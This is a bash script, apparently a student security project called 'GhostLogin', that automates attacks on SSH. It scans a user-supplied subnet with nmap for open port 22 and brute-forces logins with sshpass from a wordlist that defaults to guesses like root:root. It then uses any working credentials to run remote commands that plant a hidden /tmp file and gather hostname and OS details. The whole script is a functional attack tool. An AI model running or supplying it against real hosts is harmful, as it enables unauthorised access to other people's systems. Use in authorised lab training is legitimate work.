#!/bin/bash

# ==========================================
# Project: GhostLogin - Automated SSH Exposure and Attack
# Student Name: Oeng Kimcheng
# Student Code: ***
# Class Code: NX***
# Lecturer: *********
# ==========================================

echo "====================================================="
echo "                 Project: Ghost Login                "
echo "====================================================="

# =====================================================
#--- 1: User Input and Validation ---
# =====================================================

#Promt the user for a target and store in variable 'TARGET'
echo -n "Enter Target IP or Subnet (e.g. 192.168.59.0/24): "
read TARGET

# Define a Regular Expression to validate IPv4 addresses and CIDR notation
IP_REGEX="^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(/(3[0-2]|[12]?[0-9]))?$"

# Check if the user input DOES NOT match the regex pattern
if [[ ! "$TARGET" =~ $IP_REGEX ]]; then
    # Print error message if the IP format is wrong
    echo "[!] Error: Invalid IP format. Octets must be 0-255."
    # Terminate the script with an error status (1) to prevent further execution
    exit 1
fi

# =====================================================
#--- 2: Scanning for SSH Services ---
# =====================================================

echo "[*] Scanning $TARGET for SSH (Port 22)..."
# Run nmap: -p 22 (port 22), --open (only show open ports), -Pn (skip host discovery), -n (no DNS resolution)
# -oG - sends "Grepable" format to stdout so it processed immediately
SCAN=$(nmap -p 22 --open -Pn -n "$TARGET" -oG -)

# Extract IPs that have port 22 open and save them to a file discovered_ips.txt
echo "$SCAN" | grep "22/open" | awk '{print $2}' > discovered_ips.txt
# Exit if no targets were found to save time/resources
if [[ ! -s discovered_ips.txt ]]; then
    echo "[!] No hosts with active SSH found. Exiting."
    exit 0
fi
#Display hosts discovered in file discovered_ips.txt
echo "[+] Discovered Hosts:"
cat discovered_ips.txt

# =====================================================
#--- 3: Credential Brute Forcing ---
# =====================================================

echo "-----------------------------------------------------"
echo "[*] Credential Setup"
echo -n "Enter path to wordlist (user:pass format) [default: dict.txt]: "
read USER_FILE

# Use the provided file, or default to file 'dict.txt' if input is empty
CREDS_FILE=${USER_FILE:-dict.txt}

#Create a small default credentials list
if [[ ! -f "$CREDS_FILE" && "$CREDS_FILE" == "dict.txt" ]]; then
    echo "[!] $CREDS_FILE not found. Generating default test credentials..."
    echo "kali:kali" > dict.txt
    echo "root:root" >> dict.txt
    echo "admin:admin" >> dict.txt
    echo "...:..." >> dict.txt #add yours
fi

# If the file still doesn't exist, stop the script
if [[ ! -f "$CREDS_FILE" ]]; then
    echo "[!] Error: Wordlist $CREDS_FILE not found."
    exit 1
fi

# Prepare fresh log files for this session
SUCCESS_LOG="successful_logins.txt"
> "$SUCCESS_LOG"

echo " [*] Starting brute force attempts..."

# --- Main Attack Loop ---
# Iterates through every IP address found in the initial scan
while read -r IP; do
    [[ -z "$IP" ]] && continue
    echo "Testing Host: $IP"
    
    # Nested loop: Try every user:pass combination against the current IP
    while read -r LINE; do
        [[ -z "$LINE" ]] && continue
        
        # Split the credentials (Format: username:password)
        USER=$(echo "$LINE" | cut -d: -f1)
        PASS=$(echo "$LINE" | cut -d: -f2)
        
        echo -n "Trying $USER:$PASS... "
        
        # Attempt non-interactive SSH login
        # -o StrictHostKeyChecking=no: Automatically accepts new SSH keys
        # -o ConnectTimeout=3: Prevents hanging on unresponsive hosts
        sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
        -o UserKnownHostsFile=/dev/null "$USER@$IP" exit > /dev/null 2>&1
        
        # Check if the SSH exit code is 0 (Success)
        if [[ $? -eq 0 ]]; then
            echo "MATCH FOUND"
            echo "$IP|$USER|$PASS" >> "$SUCCESS_LOG"
            break # Stop testing this IP and move to the next one
        else
            echo "NOT FOUND"
        fi
    done < "$CREDS_FILE"
done < discovered_ips.txt

# =====================================================
#--- 4: Post-Exploitation Automation (PoC)--- 
# =====================================================

# Only run if found working credentials
if [[ -s "$SUCCESS_LOG" ]]; then
    echo " -----------------------------------------------------"
    echo " [*] Executing Post-Exploitation..."
    
    POC_LOG="poc_execution.log"
    > "$POC_LOG"

    while IFS="|" read -r IP USER PASS; do
        # Automated, non-interactive command execution
        # Create a hidden file (/tmp/.audit_poc)
        # sshpass handles credentials; flags bypass host-key prompts
        SYS_INFO=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no \
                                         -o UserKnownHostsFile=/dev/null \
                                         -o ConnectTimeout=5 \
                                         "$USER@$IP" "touch /tmp/.audit_poc && hostname && uname -s" 2>/dev/null)
        
        if [[ $? -eq 0 ]]; then
            echo " [+] PoC Successful: Hidden file created & info gathered from $IP"
            # Format output: 'IP | Hostname OS'
            echo "$IP | $(echo "$SYS_INFO" | xargs)" >> "$POC_LOG"
        else
            echo " [!] PoC Failed on $IP (Connection or Permission issue)"
        fi
    done < "$SUCCESS_LOG"

# =====================================================
#--- 5: Output and Reporting --- 
# =====================================================

    # Header Setup: Adjusted widths for better readability
    # %-15s = IP (15 chars) | %-10s = Status (10 chars) | %-30s = Info (30 chars)
    printf "%-15s | %-10s | %-30s\n" "IP Address" "Status" "System Info"
    echo "-----------------------------------------------------"

    while IFS="|" read -r IP USER PASS; do
        # Extract the PoC info for this specific IP from the POC_LOG
        # Use '^' to ensure match the IP at the start of the line only
        INFO=$(grep "^$IP " "$POC_LOG" | cut -d'|' -f2 | xargs)

        # Print the formatted row
        # If INFO is empty, it defaults to "N/A"
        printf "%-15s | %-10s | %-30s\n" "$IP" "ACCESSED" "${INFO:-N/A}"
        
    done < "$SUCCESS_LOG"

else
    # If the Success Log is empty or doesn't exist
    echo -e "\n[!] Final Report: No successful logins were identified."
fi